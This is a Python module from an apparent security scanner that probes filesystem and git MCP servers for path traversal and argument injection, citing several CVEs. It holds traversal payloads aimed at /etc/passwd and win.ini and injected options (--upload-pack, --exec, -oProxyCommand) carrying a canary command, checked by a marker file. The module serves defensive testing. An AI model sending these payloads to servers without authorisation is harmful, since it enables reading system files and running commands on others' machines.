# SPDX-License-Identifier: AGPL-3.0-or-later
"""Path traversal + argument injection probes for filesystem/git MCP servers.

Targets:
- CVE-2025-68143 (mcp-server-git git_init arbitrary path)
- CVE-2025-68144 (mcp-server-git argument injection)
- CVE-2025-68145 (mcp-server-git path traversal)
- filesystem-mcp class path bypass
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any

from ..client import McpClient
from ..jsonrpc import JsonRpcCodec

_PATH_PAYLOADS = [
    "../../../../etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
]

_ARG_INJECTION_PAYLOADS = [
    "--upload-pack=touch /tmp/mas-sentry-arginj",
    "--exec=touch /tmp/mas-sentry-arginj",
    "-oProxyCommand=touch /tmp/mas-sentry-arginj",
]

_ARG_INJ_CANARY = Path("/tmp/mas-sentry-arginj")  # noqa: S108  # nosec B108


@dataclass(frozen=True, slots=True)
class TraversalFinding:
    tool: str
    payload: str
    confirmed: bool
    note: str = ""


def probe_path_traversal(client: McpClient) -> list[TraversalFinding]:
    tools = client.list_tools()
    out: list[TraversalFinding] = []
    for tool in tools:
        param_name = _first_path_param(tool.input_schema)
        if not param_name:
            continue
        for payload in _PATH_PAYLOADS:
            req = JsonRpcCodec.request(
                "tools/call",
                {"name": tool.name, "arguments": {param_name: payload}},
                req_id=client.next_id(),
            )
            resp = client.transport.send(req)
            if resp.is_error:
                out.append(
                    TraversalFinding(
                        tool=tool.name,
                        payload=payload,
                        confirmed=False,
                        note=f"server denied: {str(resp.error)[:120]}",
                    )
                )
                continue
            body = str(resp.result)[:300]
            confirmed = "root:" in body or "[fonts]" in body.lower()
            if confirmed:
                out.append(
                    TraversalFinding(
                        tool=tool.name,
                        payload=payload,
                        confirmed=True,
                        note=body[:120],
                    )
                )
            # silent OK responses without sensitive content are dropped
    return out


def probe_arg_injection(client: McpClient) -> list[TraversalFinding]:
    tools = client.list_tools()
    out: list[TraversalFinding] = []
    for tool in tools:
        param_name = _first_string_param(tool.input_schema)
        if not param_name:
            continue
        for payload in _ARG_INJECTION_PAYLOADS:
            req = JsonRpcCodec.request(
                "tools/call",
                {"name": tool.name, "arguments": {param_name: payload}},
                req_id=client.next_id(),
            )
            resp = client.transport.send(req)
            confirmed = _ARG_INJ_CANARY.exists()
            if confirmed:
                _ARG_INJ_CANARY.unlink(missing_ok=True)
                out.append(
                    TraversalFinding(
                        tool=tool.name,
                        payload=payload,
                        confirmed=True,
                        note="canary file created",
                    )
                )
            elif resp.is_error:
                out.append(
                    TraversalFinding(
                        tool=tool.name,
                        payload=payload,
                        confirmed=False,
                        note=f"server denied: {str(resp.error)[:120]}",
                    )
                )
            # silent OK without canary is dropped
    return out


def _first_path_param(schema: dict[str, Any] | None) -> str | None:
    for k, v in ((schema or {}).get("properties") or {}).items():
        if isinstance(v, dict) and any(t in k.lower() for t in ("path", "file", "uri", "dir")):
            return k
    return None


def _first_string_param(schema: dict[str, Any] | None) -> str | None:
    for k, v in ((schema or {}).get("properties") or {}).items():
        if isinstance(v, dict) and v.get("type") == "string":
            return k
    return None
